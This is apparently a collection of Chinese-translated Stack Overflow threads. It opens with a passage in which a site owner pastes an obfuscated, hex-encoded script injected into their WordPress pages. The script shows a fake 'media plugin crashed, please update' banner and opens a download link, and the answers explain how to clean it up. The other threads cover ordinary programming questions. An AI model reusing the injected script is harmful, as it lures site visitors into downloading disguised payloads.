var _0xf475=["\x69\x6D\x77\x62\x5F\x63\x61\x62\x31\x5F\x73\x68\x6F\x77","\x4E","\x69\x6D\x77\x62\x5F\x63\x61\x62\x31\x5F\x72\x65\x73\x68\x6F\x77","\x72\x61\x6E\x64\x6F\x6D","\x3C\x64\x69\x76\x20\x63\x6C\x61\x73\x73\x3D\x22\x69\x6D\x77\x62\x5F\x63\x61\x62\x61\x72\x22\x20\x69\x64\x3D\x22\x63\x61\x62\x5F\x31\x5F\x30\x22\x3E\x3C\x69\x6D\x67\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x31\x32\x33\x34\x35\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x63\x6F\x76\x65\x72\x74\x61\x63\x74\x69\x6F\x6E\x62\x61\x72\x2D\x70\x72\x6F\x2F\x69\x6D\x61\x67\x65\x73\x2F\x77\x61\x72\x6E\x69\x6E\x67\x2E\x67\x69\x66\x22\x3E\x3C\x70\x3E\x4F\x70\x70\x73\x21\x20\x59\x6F\x75\x72\x20\x58\x76\x69\x64\x20\x4D\x65\x64\x69\x61\x20\x50\x6C\x75\x67\x69\x6E\x20\x68\x61\x73\x20\x43\x72\x61\x73\x68\x65\x64\x21\x20\x3C\x73\x74\x72\x6F\x6E\x67\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x74\x65\x78\x74\x2D\x64\x65\x63\x6F\x72\x61\x74\x69\x6F\x6E\x3A\x20\x75\x6E\x64\x65\x72\x6C\x69\x6E\x65\x3B\x22\x3E\x3C\x73\x70\x61\x6E\x20\x73\x74\x79\x6C\x65\x3D\x22\x63\x6F\x6C\x6F\x72\x3A\x20\x23\x30\x30\x30\x30\x66\x66\x3B\x20\x74\x65\x78\x74\x2D\x64\x65\x63\x6F\x72\x61\x74\x69\x6F\x6E\x3A\x20\x75\x6E\x64\x65\x72\x6C\x69\x6E\x65\x3B\x22\x3E\x50\x6C\x65\x61\x73\x65\x20\x55\x70\x64\x61\x74\x65\x64\x20\x4E\x6F\x77\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x73\x70\x61\x6E\x3E\x3C\x2F\x73\x74\x72\x6F\x6E\x67\x3E\x3C\x2F\x70\x3E\x3C\x6F\x62\x6A\x65\x63\x74\x20\x77\x69\x64\x74\x68\x3D\x22\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x22\x20\x69\x64\x3D\x22\x70\x6C\x61\x79\x65\x72\x22\x20\x63\x6C\x61\x73\x73\x69\x64\x3D\x22\x63\x6C\x73\x69\x64\x3A\x44\x32\x37\x43\x44\x42\x36\x45\x2D\x41\x45\x36\x44\x2D\x31\x31\x63\x66\x2D\x39\x36\x42\x38\x2D\x34\x34\x34\x35\x35\x33\x35\x34\x30\x30\x30\x30\x22\x3E\x3C\x70\x61\x72\x61\x6D\x20\x6E\x61\x6D\x65\x3D\x22\x6D\x6F\x76\x69\x65\x22\x20\x76\x61\x6C\x75\x65\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x31\x32\x33\x34\x35\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x63\x6F\x76\x65\x72\x74\x61\x63\x74\x69\x6F\x6E\x62\x61\x72\x2D\x70\x72\x6F\x2F\x4A\x46\x50\x6C\x61\x79\x49\x74\x2E\x73\x77\x66\x3F\x75\x72\x6C\x3D\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x31\x32\x33\x34\x35\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x63\x6F\x76\x65\x72\x74\x61\x63\x74\x69\x6F\x6E\x62\x61\x72\x2D\x70\x72\x6F\x2F\x63\x61\x62\x61\x72\x2E\x6D\x70\x33\x22\x3E\x3C\x65\x6D\x62\x65\x64\x20\x73\x72\x63\x3D\x22\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x31\x32\x33\x34\x35\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x63\x6F\x76\x65\x72\x74\x61\x63\x74\x69\x6F\x6E\x62\x61\x72\x2D\x70\x72\x6F\x2F\x4A\x46\x50\x6C\x61\x79\x49\x74\x2E\x73\x77\x66\x3F\x75\x72\x6C\x3D\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x31\x32\x33\x34\x35\x2F\x77\x70\x2D\x63\x6F\x6E\x74\x65\x6E\x74\x2F\x70\x6C\x75\x67\x69\x6E\x73\x2F\x63\x6F\x76\x65\x72\x74\x61\x63\x74\x69\x6F\x6E\x62\x61\x72\x2D\x70\x72\x6F\x2F\x63\x61\x62\x61\x72\x2E\x6D\x70\x33\x22\x20\x6E\x61\x6D\x65\x3D\x22\x70\x6C\x61\x79\x65\x72\x22\x20\x77\x69\x64\x74\x68\x3D\x22\x30\x22\x20\x68\x65\x69\x67\x68\x74\x3D\x22\x30\x22\x20\x74\x79\x70\x65\x3D\x22\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x73\x68\x6F\x63\x6B\x77\x61\x76\x65\x2D\x66\x6C\x61\x73\x68\x22\x3E\x3C\x2F\x65\x6D\x62\x65\x64\x3E\x3C\x2F\x6F\x62\x6A\x65\x63\x74\x3E\x3C\x2F\x64\x69\x76\x3E","\x70\x72\x65\x70\x65\x6E\x64","\x62\x6F\x64\x79","\x2F\x31\x32\x33\x34\x35\x2F","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x77\x73\x63\x72\x69\x70\x74\x73\x2E\x6F\x72\x67\x2F\x64\x6F\x77\x6E\x6C\x6F\x61\x64\x2D\x76\x6C\x63\x2D\x70\x6C\x61\x79\x65\x72\x2F\x3F\x6D\x6E\x3D\x34\x34\x36\x33\x34\x33\x34\x32\x32\x32\x36","\x5F\x73\x65\x6C\x66","\x6F\x70\x65\x6E"];function imwb_activate_cab(){if(cabCookie(_0xf475[0])==_0xf475[1]||cabCookie(_0xf475[2])==_0xf475[1]){return ;} ;setTimeout(imwb_show_cab,2000);} ;function imwb_show_cab(){if(Math[_0xf475[3]]()<0.02){jQuery(_0xf475[6])[_0xf475[5]](_0xf475[4]);cabCookie(_0xf475[2],_0xf475[1],0,_0xf475[7]);} ;} ;function imwb_goto_cab_link(){cabCookie(_0xf475[0],_0xf475[1],0,_0xf475[7]);window[_0xf475[10]](_0xf475[8],_0xf475[9]);} ; 
```

问题是如何删除出现在浏览器页面源中的这些代码。

[**你可以在这里**](http://pastebin.com/MAEADET4)看到加密的脚本[](http://pastebin.com/MAEADET4)

 **关于如何摆脱这些代码的任何其他解决方案？

谢谢！！！

PD：该网站没有使用任何插件

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-08-11T21:50:15.180

上周我得到了类似的东西，但只感染了 PHP 文件。你能在标题中显示你的代码吗？

我未转义您放置的代码，我看到它显然是在试图窃取您用户的 cookie 并显示某种横幅，我建议您立即关闭您的网站并尝试从您的页面手动清理代码.. 如果您使用的是使用比这更旧版本的 timthumb 的主题可能是您的安全漏洞！

首先是对公共访问者禁用该网站，因为我认为此代码可能试图将病毒下载到访问者的浏览器！

为此，只需在根目录中创建该 .htaccess 文件：

```
<IfModule mod_rewrite.c>
 RewriteEngine on
 RewriteCond %{REMOTE_ADDR} !^192\.168\.0\.100
 RewriteCond %{REQUEST_URI} !/pageisdown.html$ [NC]
 RewriteCond %{REQUEST_URI} !\.(jpe?g?|png|gif) [NC]
 RewriteRule .* /pageisdown.html [R=302,L]
</IfModule> 
```

我从[这里](http://perishablepress.com/htaccess-redirect-maintenance-page-site-updates/)得到这个 然后将 192.168.0.100 行更改为您自己的公共 IP 地址，然后只有您可以访问该站点，其他任何人都将被重定向到 pageisdown.html 页面！（随意创建此页面并添加您喜欢的任何内容..）

第二件事你需要手动扫描你的文件，看看这个脚本是从哪里来的，通常它会是一个看起来像这样的 php 函数的形式

```
eval(base64_decode(....)) 
```

点（...）通常是很多 base64 编码的代码，只需删除该函数调用，您就会干净！，并确保没有后门文件，只需检查您的服务器是否有新创建的 php 文件或其他脚本你不记得创建..

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-08-12T07:23:55.383

**我想我找到了解决**方法：在**wordpress.stackexchange.com**中阅读主题“ *header.php 中的恶意软件”有人在***wp_head()**上方发现了一个代码并清理了代码，但几个小时后又出现了。

 ****我寻找类似的东西，但没有发现任何可疑之处。以防万一我像这样在**wp_head(** )上方评论了 2 行

```
<!-- <link rel="pingback" href="<?php bloginfo('pingback_url'); ?>" />
<?php if ( is_singular() ) wp_enqueue_script( 'comment-reply' ); ?> --> 
```

然后重新加载网站几次，现在似乎没问题：没有消息，查看页面源时没有加密脚本，没有 wscripts.org 尝试加载等。***现在网站加载速度更快。***

我也做了一些安全修复。

如果再次发生，我会告诉你。

**希望这对处于类似情况的人有用。********

# python - 如何在 scipy/matplotlib 中绘制和注释层次聚类树状图

> ID：11917779
> 
> 赞同：45
> 
> 时间：2012-08-11T21:24:11.413
> 
> 标签：python, numpy, matplotlib, scipy, dendrogram

我正在使用`dendrogram`from`scipy`来绘制层次聚类`matplotlib`，如下所示：

```
mat = array([[1, 0.5, 0.9],
             [0.5, 1, -0.5],
             [0.9, -0.5, 1]])
plt.subplot(1,2,1)
plt.title("mat")
dist_mat = mat
linkage_matrix = linkage(dist_mat,
                         "single")
print "linkage2:"
print linkage(1-dist_mat, "single")
dendrogram(linkage_matrix,
           color_threshold=1,
           labels=["a", "b", "c"],
           show_leaf_counts=True)
plt.subplot(1,2,2)
plt.title("1 - mat")
dist_mat = 1 - mat
linkage_matrix = linkage(dist_mat,
                         "single")
dendrogram(linkage_matrix,
           color_threshold=1,
           labels=["a", "b", "c"],
           show_leaf_counts=True) 
```

我的问题是：首先，为什么在`mat`这里`1-mat`给出相同的聚类？其次，我如何注释树的每个分支的`dendrogram`距离，以便可以比较节点对之间的距离？

最后似乎`show_leaf_counts`标志被忽略了，有没有办法打开它，以便显示每个类中的对象数量？谢谢。![在此处输入图像描述](../Images/77f7cf55144ff0b925935eb70c8752a9.png)

* * *

## 回答 #1

> 赞同：69
> 
> 时间：2012-09-07T04:34:39.330

的输入`linkage()`要么是一个 nxm 数组，表示 m 维空间中的 n 个点，要么是一个包含[*压缩*距离矩阵](https://stackoverflow.com/questions/13079563/how-does-condensed-distance-matrix-work-pdist)的一维数组。在您的示例中，`mat`是 3 x 3，因此您正在聚类三个 3-d 点。聚类基于这些点之间的距离。

*为什么 mat 和 1-mat 在这里给出相同的聚类？*

数组`mat`和`1-mat`产生相同的聚类，因为聚类基于点之间的距离，并且整个数据集的反射（ `-mat`）和平移（ ）都不会改变点之间的相对距离。`mat + offset`

*如何使用树状图注释树的每个分支的距离，以便可以比较节点对之间的距离？*

在下面的代码中，我展示了如何使用 dendrogram 返回的数据来标记图表的水平线段和相应的距离。与键关联的值，`icoord`并`dcoord`给出图形的每个三段倒 U 的 x 和 y 坐标。在`augmented_dendrogram`此数据中，用于在树状图中添加每个水平线段的距离（即 y 值）的标签。

```
from scipy.cluster.hierarchy import dendrogram
import matplotlib.pyplot as plt

def augmented_dendrogram(*args, **kwargs):

    ddata = dendrogram(*args, **kwargs)

    if not kwargs.get('no_plot', False):
        for i, d in zip(ddata['icoord'], ddata['dcoord']):
            x = 0.5 * sum(i[1:3])
            y = d[1]
            plt.plot(x, y, 'ro')
            plt.annotate("%.3g" % y, (x, y), xytext=(0, -8),
                         textcoords='offset points',
                         va='top', ha='center')

    return ddata 
```

对于您的`mat`阵列，增强的树状图是

![三点的树状图](../Images/0cbd3da321020008825ed243c2b764f9.png)

所以点'a'和'c'相距1.01个单位，点'b'距离簇['a','c'] 1.57个单位。

*似乎`show_leaf_counts`标志被忽略了，有没有办法打开它，以便显示每个类中的对象数量？*

`show_leaf_counts`仅当并非所有原始数据点都显示为叶子时，该标志才适用。例如，当 时`trunc_mode = "lastp"`，仅显示最后一个`p`节点。

这是一个100分的例子：

```
import numpy as np
from scipy.cluster.hierarchy import linkage
import matplotlib.pyplot as plt
from augmented_dendrogram import augmented_dendrogram

# Generate a random sample of `n` points in 2-d.
np.random.seed(12312)
n = 100
x = np.random.multivariate_normal([0, 0], np.array([[4.0, 2.5], [2.5, 1.4]]),
                                  size=(n,))

plt.figure(1, figsize=(6, 5))
plt.clf()
plt.scatter(x[:, 0], x[:, 1])
plt.axis('equal')
plt.grid(True)

linkage_matrix = linkage(x, "single")

plt.figure(2, figsize=(10, 4))
plt.clf()

plt.subplot(1, 2, 1)
show_leaf_counts = False
ddata = augmented_dendrogram(linkage_matrix,
               color_threshold=1,
               p=6,
               truncate_mode='lastp',
               show_leaf_counts=show_leaf_counts,
               )
plt.title("show_leaf_counts = %s" % show_leaf_counts)

plt.subplot(1, 2, 2)
show_leaf_counts = True
ddata = augmented_dendrogram(linkage_matrix,
               color_threshold=1,
               p=6,
               truncate_mode='lastp',
               show_leaf_counts=show_leaf_counts,
               )
plt.title("show_leaf_counts = %s" % show_leaf_counts)

plt.show() 
```

这些是数据集中的点：

![100 个点的散点图](../Images/1f3c21ae9d44b3eddbf4bf8846e86532.png)

使用`p=6`和`trunc_mode="lastp"`， `dendrogram`仅显示树状图的“顶部”。下图展示了效果`show_leaf_counts`。

![show_leaf_counts 的显示效果](../Images/f6ee9da28f245dd9935ebe273bf02f0b.png)

* * *

## 回答 #2

> 赞同：15
> 
> 时间：2012-09-07T04:13:46.663

我认为对于您尝试使用的功能的使用存在一些误解。这是一个完整的代码片段来说明我的观点：

```
import matplotlib.pyplot as plt
from scipy.cluster.hierarchy import dendrogram, linkage
from numpy import array
import numpy as np

mat = array([184, 222, 177, 216, 231,
             45, 123, 128, 200,
             129, 121, 203,
             46, 83,
             83])

dist_mat = mat

linkage_matrix = linkage(dist_mat, 'single')
print linkage_matrix

plt.figure(101)
plt.subplot(1, 2, 1)
plt.title("ascending")
dendrogram(linkage_matrix,
           color_threshold=1,
           truncate_mode='lastp',
           labels=array(['a', 'b', 'c', 'd', 'e', 'f']),
           distance_sort='ascending')

plt.subplot(1, 2, 2)
plt.title("descending")
dendrogram(linkage_matrix,
           color_threshold=1,
           truncate_mode='lastp',
           labels=array(['a', 'b', 'c', 'd', 'e', 'f']),
           distance_sort='descending')

def make_fake_data():
    amp = 1000.
    x = []
    y = []
    for i in range(0, 10):
        s = 20
        x.append(np.random.normal(30, s))
        y.append(np.random.normal(30, s))
    for i in range(0, 20):
        s = 2
        x.append(np.random.normal(150, s))
        y.append(np.random.normal(150, s))
    for i in range(0, 10):
        s = 5
        x.append(np.random.normal(-20, s))
        y.append(np.random.normal(50, s))

    plt.figure(1)
    plt.title('fake data')
    plt.scatter(x, y)

    d = []
    for i in range(len(x) - 1):
        for j in range(i+1, len(x) - 1):
            d.append(np.sqrt(((x[i]-x[j])**2 + (y[i]-y[j])**2)))
    return d

mat = make_fake_data()

plt.figure(102)
plt.title("Three Clusters")

linkage_matrix = linkage(mat, 'single')
print "three clusters"
print linkage_matrix

dendrogram(linkage_matrix,
           truncate_mode='lastp',
           color_threshold=1,
           show_leaf_counts=True)

plt.show() 
```

首先，计算 m -> m - 1 并没有真正改变你的结果，因为距离矩阵，它基本上描述了所有唯一对之间的相对距离，在你的具体情况下没有改变。（在我上面的示例代码中，所有距离都是欧几里得距离，因此所有距离都是正的，并且与 2d 平面上的点一致。）

对于您的第二个问题，您可能需要推出自己的注释例程来做您想做的事情，因为我认为 dendrogram 本身并不支持它......

对于最后一个问题， show_leaf_counts 似乎仅在您尝试使用 truncate_mode='lastp' 选项显示非单一叶节点时才有效。基本上，叶子紧紧地聚集在一起，不容易看到。因此，您可以选择仅显示一片叶子，但可以选择显示（在括号中）该叶子中聚集了多少。

希望这可以帮助。

# scala - GET 和 POST 请求在一个操作中完成。播放框架。斯卡拉

> ID：11917785
> 
> 赞同：1
> 
> 时间：2012-08-11T21:25:10.297
> 
> 标签：scala, functional-programming, playframework-2.0

动作创建显示形式：

```
def create = Action {
    Ok(html.post.create(postForm))
} 
```

我如何修改此操作，以便对于 GET 请求它会给出表单，而对于 POST 请求它会处理用户输入数据，就好像它是一个单独的操作一样：

```
def newPost = Action { implicit request =>
   postForm.bindFromRequest.fold(
       errors => BadRequest(views.html.index(Posts.all(), errors)),
       label => {
           Posts.create(label)
           Redirect(routes.Application.posts)
       }
   )
} 
```

我的意思是我想把这两个动作结合起来。

UPDATE1：我想要一个服务于 GET 和 POST 请求的操作

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-08-12T09:49:26.297

建议不要合并这两个操作，而是修改路由以获得您期望的行为。例如：

```
GET    /create    controllers.Posts.create
POST   /create    controllers.Posts.newPost 
```

如果您有多种资源（例如帖子和评论），只需在路径中添加前缀即可消除歧义：

```
GET    /post/create       controllers.Posts.create
POST   /post/create       controllers.Posts.newPost
GET    /comment/create    controllers.Comments.create
POST   /comment/create    controllers.Comments.newComment 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-08-12T11:14:42.263

我曾经尝试过完成类似的事情，但我意识到我并没有像使用它那样使用框架。使用单独的 GET 和 POST 方法，如 @paradigmatic 所示，在您指定的情况下`"If we take adding comments to another action, we wouldn't be able to get infomation on post and comments in case an error occured (avoding copy-paste code)."`- 只需使用您喜欢的视图在控制器方法的末尾呈现页面？对于错误等，您也可以随时使用闪存范围吗？`http://www.playframework.org/documentation/2.0.2/ScalaSessionFlash`您还可以使用两个或多个 bean 呈现此表单页面并将它们发送到控制器端以捕获相关的错误消息和数据。？

# java - 在 Ubuntu Linux 中更改文件夹的读/写访问权限

> ID：11917786
> 
> 赞同：8
> 
> 时间：2012-08-11T21:25:11.543
> 
> 标签：java, servlets, amazon-web-services, amazon-ebs

我想`Amazon EBS`从安装在运行 Ubuntu 的 Amazon EC2 上的 Java Servlet 的卷中创建一个文件夹并在创建的文件夹中写入一个文件。

我已将 EBS 卷安装在

```
/mnt/my-address 
```

但是 Servlet 无法创建文件夹和写入文件？

**我的问题**

为什么 Java sevlet 无法在 Amazon EBS 挂载卷上创建文件夹？

* * *

## 回答 #1

> 赞同：27
> 
> 时间：2012-08-12T19:09:39.890

看起来您的文件夹没有正确的读/写权限。

尝试授予所有用户对相关目录的读写访问权限，例如：

```
sudo chmod -R ugo+rw /mnt/my-address 
```

如果您对向所有人授予写权限感到不舒服，您可以通过使用所有权和组来微调权限，但我需要有关您的设置的更多信息来帮助您。

**编辑**：如果 ec2-user 是唯一需要访问的人，您可以将目录的所有权更改为该用户，然后仅授予他访问权限：

```
sudo chown -R ec2-user:ec2-user /mnt/my-address
sudo chmod -R u+rw,go-rw /mnt/my-address 
```

# c++ - 用 C 中的文本文件的内容初始化一个数组

> ID：11917792
> 
> 赞同：1
> 
> 时间：2012-08-11T21:25:50.467
> 
> 标签：c++, c, arrays, visual-c++

我编写了下面的代码来从文本文件中读取数据并将值存储在数组中。我的代码没有读取文件。

正在使用的库头文件

```
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <math.h>
#include <conio.h> 
```

我的主要

```
int main()
{   
FILE *fpoo;
float NumArr[5]; 
```

//我同样尝试过“c:\Fly_u.txt”

```
fpoo= fopen ("Fly_u.txt","r");
if(fpoo!=NULL)

    for (int i=0;i<6;i++)
    {
        fscanf(fpoo,"%d\n",NumArr[i]);
    {
else
{
    printf("me");

}
for (int i=0;i<6;i++)
{
    printf("%f",NumArr[i]);
}

fclose(fpoo);
_getche();
return 0;
} 
```

//文本文件内容如下

```
0.99247
0.14727
-0.00041387
-1.737
0.20475
-0.052151
0.14755
-0.0233
-0.32606
0.092085
0.059199
-0.025587
0.0097565
0.13639
0.12007 
```

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-08-11T21:30:02.070

使用[`fscanf()`](http://en.cppreference.com/w/c/io/fscanf)不正确：

*   您需要使用格式说明符，`float`而`%f`不是`int`
*   您需要传递 a `float`（即 a `float*`）的地址，而不是 a`float`

改变：

```
fscanf(fpoo,"%d\n",NumArr[i]); 
```

至：

```
fscanf(fpoo,"%f\n", &NumArr[i]); 
```

`fscanf()`返回成功分配的数量，在这种情况下应该是`1`. 建议在稍后尝试使用它们之前检查输入是否已成功读取。

如果指定`"Fly_u.txt"`为文件名，则它*必须*与进程的工作目录位于同一目录中。记住`'\'`在构建路径时要转义，或者只是使用`'/'`（这也适用于 Windows）。

当数组索引从to`for`运行时，循环将导致未定义的行为。因此，对于有效索引，但两个循环的终止条件是使用索引：非法。增加循环的大小或调整循环的终止条件。`0``N - 1``float NumArr[5];``0, 1, 2, 3, 4``for``i < 6``5``NumArr``for`

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-08-11T21:29:32.447

尝试这个

```
fscanf(fpoo,"%f\n",&NumArr[i]);
              ^    ^
              ^    ^ 
```

也就是说，传递要存储数据的变量的地址。请注意，`%f`而不是`%d`也。

您没有指定问题，但是如果您在返回时遇到问题，`fopen`请检查您的文件路径并尝试将完整路径传递给您的文件。正如@hmjd 所说，您现在所做的假设该文件与您的可执行文件存在于同一位置。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-11T21:29:44.817

'我同样尝试过 "c:\Fly_u.txt"' 这是错误的，因为 \ 在 C 字符串中具有特殊含义。你应该使用的是`"c:\\Fly_u.txt"`.

# asp.net-mvc-3 - Castle Windsor 仅实例化服务的一个实例，即使生活方式设置为 Transient 或 PerWebRequest

> ID：11917793
> 
> 赞同：0
> 
> 时间：2012-08-11T21:25:57.457
> 
> 标签：asp.net-mvc-3, inversion-of-control, castle-windsor

当然，我正在使用 MVC 3 和 Castle Windsor 开发应用程序。我无法让 Windsor 实例化多个对象 - 即使该服务可能已使用 Transient 或 PerWebRequest 注册。

```
container.Register(Component.For<ISession>().LifestylePerWebRequest().ImplementedBy<SessionImpl>()); 
```

据我所知，这是所有相关代码。解析 ISession 工作正常，接收 SessionImpl 对象。

SessionImpl 只是我为显示问题而创建的一个虚拟对象：

```
public class SessionImpl : ISession
{
    public SessionImpl()
    {
         //Called once   
    }

    public void Dispose()
    {
        //Called once 
    }
} 
```

当我收到下一个请求的 ISession 已经被处理时，我首先注意到了这个问题——所以我确信我每次都得到相同的 ISession。有什么想法我可能做错了吗？它在解决方案资源管理器 -> 参考中显示 Castle Windsor 3.0.0。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-08-11T23:55:49.650

你的[生活方式不匹配](http://docs.castleproject.org/Windsor.Debugger-views.ashx#Potential_Lifestyle_Mismatches_6)。修理它。

# unix - httrack 跟随重定向

> ID：11917794
> 
> 赞同：4
> 
> 时间：2012-08-11T21:26:06.910
> 
> 标签：unix, download, automation, httrack

我尝试从用户提供的 URL 开始递归地镜像网页（当然有深度限制）。Wget 没有从 css/js 捕获链接，所以我决定使用[httrack](http://www.httrack.com)。

我尝试镜像一些这样的网站：

```
# httrack <http://onet.pl> -r6 --ext-depth=6 -O ./a "+*" 
```

该网站使用重定向（301）到[http://www.onet.pl:80](http://www.onet.pl:80)，httrack 只是下载 index.html 页面：

```
<a HREF="onet.pl/index.html" >Page has moved</a> 
```

仅此而已！当我运行时：

```
# httrack <http://www.onet.pl> -r6 --ext-depth=6 -O ./a "+*" 
```

它做我想要的。

有没有办法让 httrack 跟随重定向？目前我只是将**“www.”+url**添加到 httrack 的 URL 中，但这不是一个真正的解决方案（不涵盖所有用户案例）。有没有更好的 linux 网站镜像工具？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-13T20:58:10.957

在主要的 httrack[论坛上](http://forum.httrack.com/readmsg/29253/29252/index.html)，一位开发人员说这是不可能的。

正确的解决方案是使用另一个 Web 镜像工具。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2018-03-14T11:58:35.137

您可以使用此脚本首先确定真正的目标 url，然后针对该 url 运行 httrack：

```
function getCorrectUrl($url) {
    $ch = curl_init();

    curl_setopt($ch, CURLOPT_HEADER, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);

    curl_setopt($ch, CURLOPT_URL, $url);
    $out = curl_exec($ch);

    // line endings is the wonkiest piece of this whole thing
    $out = str_replace("\r", "", $out);

    // only look at the headers
    $headers_end = strpos($out, "\n\n");

    if ($headers_end !== false) {
        $out = substr($out, 0, $headers_end);
    }

    $headers = explode("\n", $out);

    foreach ($headers as $header) {
        if (substr($header, 0, 10) == "Location: ") {
            $target = substr($header, 10);
            return $target;
        }
    }

    return $url;
} 
```

# jquery - 如果在资产管道中指定，rails 3.1 会下载 jquery 和 jquery ui 文件吗？

> ID：11917801
> 
> 赞同：0
> 
> 时间：2012-08-11T21:27:12.897
> 
> 标签：jquery, ruby-on-rails, asset-pipeline

如果在资产管道中指定，rails 3.1 会下载 jquery 和 jquery ui 文件吗？我安装了 gems 并且我的 application.js 如下我需要手动将 jquery 复制到管道中吗？

宝石文件：

```
source 'http://rubygems.org'

gem 'rails', '3.1.0'

# Bundle edge Rails instead:
# gem 'rails',     :git => 'git://github.com/rails/rails.git'

gem 'sqlite3'

# Gems used only for assets and not required
# in production environments by default.
group :assets do
  gem 'sass-rails', "  ~> 3.1.0"
  gem 'coffee-rails', "~> 3.1.0"
  gem 'uglifier'
  gem 'jquery-rails'
  gem 'jquery-ui-rails'
end

#gem 'jquery-rails'

# Use unicorn as the web server
# gem 'unicorn'

# Deploy with Capistrano
# gem 'capistrano'

# To use debugger
# gem 'ruby-debug19', :require => 'ruby-debug'

group :test do
  # Pretty printed test output
  gem 'turn', :require => false
end 
```

布局：

```
<!DOCTYPE html>
<html>
<head>
  <title>Depot31</title>
  <%= stylesheet_link_tag    "application" %>
  <%= javascript_include_tag "application" %>
  <%= csrf_meta_tags %>
</head>
<body>

<%= yield %>

</body>
</html> 
```

应用程序.js

```
// This is a manifest file that'll be compiled into including all the files listed below.
// Add new JavaScript/Coffee code in separate files in this directory and they'll automatically
// be included in the compiled file accessible from http://example.com/assets/application.js
// It's not advisable to add code directly here, but if you do, it'll appear at the bottom of the
// the compiled file.
//= require jquery
//= require jquery-ui
//= require jquery_ujs
//= require_tree . 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-08-11T22:15:38.823

如果您在 Gemfile 中添加以下行，资产管道会处理此问题：

```
gem "jquery-rails"
gem 'jquery-ui-rails' 
```

检查[jquery-rails](https://github.com/indirect/jquery-rails/)和[jquery-ui-rails](https://github.com/joliss/jquery-ui-rails)了解更多信息如何设置这个 gem

# php - 如何从大于可用 RAM 的 xml 文件中删除 xml 元素/节点？

> ID：11917804
> 
> 赞同：7
> 
> 时间：2012-08-11T21:27:34.703
> 
> 标签：php, xml

我试图弄清楚如何从 php（最新版本）中非常大的 xml 文件中删除元素（及其子项）。

我知道我可以使用 dom 和 simpleXml，但这需要将文档加载到内存中。

我正在查看 XML 编写器/读取器/解析器函数和谷歌搜索，但似乎没有关于该主题的内容（所有答案都建议使用 dom 或 simpleXml）。这不可能是正确的——我错过了什么吗？

我发现的最接近的是这个（C#）：

> 您可以使用 XmlReader 顺序读取您的 xml（ReadOuterXml 在您的情况下一次读取整个节点可能很有用）。然后使用 XmlWriter 写出您要保留的所有节点。（[从大型 XML 文件中删除节点](https://stackoverflow.com/questions/9057235/deleting-nodes-from-large-xml-files)）

真的吗？那是方法吗？我必须复制整个大文件？

真的没有别的办法了吗？

# 一种方法

正如建议的那样，

我可以使用 phps XML 阅读器或解析器读取数据，可能会对其进行缓冲，然后将其写入/转储+附加到新文件中。

**但这种方法真的实用吗？**

我有将巨大的 xml 文件拆分成更小的部分的经验，基本上是使用建议的方法，并且这个过程需要很长时间才能完成。

我的数据集目前还不够大，无法让我了解这将如何解决。我只能假设结果是一样的（一个非常缓慢的过程）。

有没有人有在实践中应用这个的经验？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-08-11T22:02:07.593

有几种方法可以增量处理大型文档，这样您就不需要一次将整个结构加载到内存中。在任何一种情况下，都是的，您需要写回您希望保留的元素并省略您想要删除的元素。

1.  PHP 有[`XMLReader`一个拉解析器的实现](http://php.net/manual/en/book.xmlreader.php)。一个[解释](http://en.wikipedia.org/wiki/XML#Pull_parsing)：

    > 拉式解析器创建一个迭代器，该迭代器按顺序访问 XML 文档中的各种元素、属性和数据。使用此迭代器的代码可以测试当前项（例如，判断它是开始元素还是结束元素，还是文本），并检查其属性（本地名称、命名空间、XML 属性的值、文本的值等） .)，并且还可以将迭代器移动到下一项。因此，代码可以在遍历文档时从文档中提取信息。

2.  或者您可以使用[SAX XML Parser](http://php.net/manual/en/book.xml.php)。[说明](http://en.wikipedia.org/wiki/XML#Simple_API_for_XML)：

    > XML 的简单 API (SAX) 是一个词法、事件驱动的接口，在该接口中，文档被连续读取，其内容作为回调报告给用户设计的处理程序对象上的各种方法。SAX 实现起来既快速又高效，但很难用于从 XML 中随机抽取信息，因为它往往会加重应用程序作者的负担，因为它需要跟踪正在处理的文档的哪一部分。

